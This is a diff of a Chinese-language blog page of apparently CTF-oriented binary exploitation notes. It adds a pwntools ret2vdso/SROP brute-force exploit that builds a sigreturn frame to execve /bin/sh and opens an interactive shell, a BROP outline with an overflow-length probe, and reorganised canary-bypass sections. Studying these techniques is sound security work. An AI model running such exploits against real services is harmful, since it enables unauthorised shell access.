+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 爆破代码</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># vdso_range = range(0xf76d9000, 0xf77ce000, 0x1000) # 旧版内核</span>
+</span></span><span class="line"><span class="cl"><span class="n">vdso_range</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xf7ed0000</span><span class="p">,</span> <span class="mh">0xf7fd0000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># 新版内核</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bruteforce</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">vdso_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vdso_addr</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">vdso_range</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">eax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">ebx</span> <span class="o">=</span> <span class="n">bin_sh_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">vdso_addr</span> <span class="o">+</span> <span class="mh">0x566</span> <span class="c1"># address of int 0x80</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">esp</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="c1"># 不可为空</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">ebp</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="c1"># 不可为空</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 确保一下几个段寄存器值正确，Ring0返回Ring3时候会用到，gdb调试p $gs,cs,es,ds,ss等查看</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">gs</span> <span class="o">=</span> <span class="mi">99</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">cs</span> <span class="o">=</span> <span class="mi">35</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">es</span> <span class="o">=</span> <span class="mi">43</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">ds</span> <span class="o">=</span> <span class="mi">43</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span><span class="o">.</span><span class="n">ss</span> <span class="o">=</span> <span class="mi">43</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">vdso_addr</span> <span class="o">+</span> <span class="mh">0x561</span> <span class="c1"># address of sigreturn</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10c</span><span class="o">+</span><span class="mi">4</span><span class="p">),</span> <span class="n">ret_addr</span><span class="p">,</span> <span class="n">frame</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 判断</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;echo pwned&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pwned&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;pwned&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="s1">&#39;Failed&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>main函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span><span class="p">,</span> <span class="n">vdso_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Try </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bruteforce</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">(</span><span class="s1">&#39;Wrong VDSO&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="s1">&#39;vdso_addr = &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vdso_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="brop">BROP</h3>
+<ul>
+<li>
+<p>Blind ROP，无法获得二进制文件通过ROP远程攻击，用于开启ASLR、NX、Canary的64位程序</p>
+</li>
+<li>
+<p>条件：栈溢出漏洞，进程崩溃立即重启且进程加载地址重启后不变</p>
+</li>
+</ul>
+<p>利用：</p>
+<ol>
+<li>判断栈溢出长度，【泄露canary、rbp、返回地址】</li>
+<li>寻找stop_gadget（可以返回main函数的gadget）</li>
+<li>寻找BROP gadgets（<code>__libc_csu_init</code>中的gadgets），定位<code>pop rdi; ret</code>地址</li>
+<li>寻找puts或write函数plt，用于泄露其他地址值</li>
+<li>dump plt表来泄露所需函数got地址</li>
+<li>泄露出got地址，libc执行系统命令getshell</li>
+</ol>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -6194,16 +6901,27 @@
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1">#可以在gdb中找到地址</span>
-</span></span><span class="line"><span class="cl">print <span class="p">&amp;</span>__libc_argv<span class="o">[</span>0<span class="o">]</span>    
-</span></span><span class="line"><span class="cl">49:0248│ r12     0x7fffffffdf68 —▸ 0x7fffffffe293 ◂— 0x736a2f656d6f682f <span class="o">(</span><span class="s1">&#39;/home/js&#39;</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl">4a:0250│         0x7fffffffdf70 ◂— 0x0 <span class="c1"># here</span>
-</span></span><span class="line"><span class="cl">4b:0258│         0x7fffffffdf78 —▸ 0x7fffffffe2cc ◂— <span class="s1">&#39;SHELL=/bin/bash&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 泄露栈溢出长度</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="栈迁移">栈迁移</h3>
+</div><h2 id="花式栈溢出">花式栈溢出</h2>
+<p>① <strong>无main函数</strong></p>
+<p>用IDA静态分析main的地址，在gdb中打该地址断点</p>
+<h3 id="栈迁移">栈迁移</h3>
 <p><strong>Stack Pivoting</strong></p>
 <ul>
 <li>溢出的距离短覆盖不到返回地址</li>
@@ -6488,15 +7206,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_addr</span><span class="p">)</span>  <span class="c1"># pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="canary绕过">Canary绕过</h3>
-<ol>
-<li>格式化字符串读取canary的值，canary最后一个值一定是&quot;\x00&quot;，可以覆盖该值来用<code>%s</code>读取，然后栈溢出再覆盖为00</li>
-<li>canary爆破，针对存在fork函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary不变</li>
-<li>Stack mashing：触发SSP Leak</li>
-<li>劫持 <code>__stack_chk_fail</code>，修改got表中该函数地址</li>
-<li>已知后门函数距起始位置地址0xabcd，则覆盖返回地址时只覆盖最低<strong>2</strong>字节，有<strong>1/16</strong>概率爆破成功</li>
-</ol>
-<h3 id="srop">SROP</h3>
+</div><h3 id="srop">SROP</h3>
 <p>（Sigreturn Oriented Programming），主要为64位中利用，sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验</p>
 <ul>
 <li>Linux i386下调用sigreturn的代码存放在vdso中</li>
@@ -9284,7 +9994,7 @@
         
             
         
-        共 122.59k 字 · 共 18篇文章
+        共 128.93k 字 · 共 18篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -9554,10 +10264,19 @@
         <li><a href="#orw-bypass">orw bypass</a></li>
       </ol>
     </li>
-    <li><a href="#沙箱sandbox">沙箱Sandbox</a>
+    <li><a href="#沙箱绕过">沙箱绕过</a>
       <ol>
+        <li><a href="#seccomp">Seccomp</a></li>
         <li><a href="#proc泄露">/proc泄露</a></li>
         <li><a href="#ptrace进程">Ptrace进程</a></li>
+      </ol>
+    </li>
+    <li><a href="#canary绕过">Canary绕过</a>
+      <ol>
+        <li><a href="#ssp-leak">SSP Leak</a></li>
+        <li><a href="#逐字节爆破">逐字节爆破</a></li>
+        <li><a href="#劫持函数">劫持函数</a></li>
+        <li><a href="#覆盖初始值">覆盖初始值</a></li>
       </ol>
     </li>
     <li><a href="#rop">ROP</a>
@@ -9567,13 +10286,12 @@
         <li><a href="#ret2csu">ret2csu</a></li>
         <li><a href="#ret2dl-resolve">ret2dl-resolve</a></li>
         <li><a href="#ret2vdso">ret2vdso</a></li>
+        <li><a href="#brop">BROP</a></li>
       </ol>
     </li>
     <li><a href="#花式栈溢出">花式栈溢出</a>
       <ol>
-        <li><a href="#ssp-leak">SSP Leak</a></li>
         <li><a href="#栈迁移">栈迁移</a></li>
-        <li><a href="#canary绕过">Canary绕过</a></li>
         <li><a href="#srop">SROP</a></li>
       </ol>
     </li>
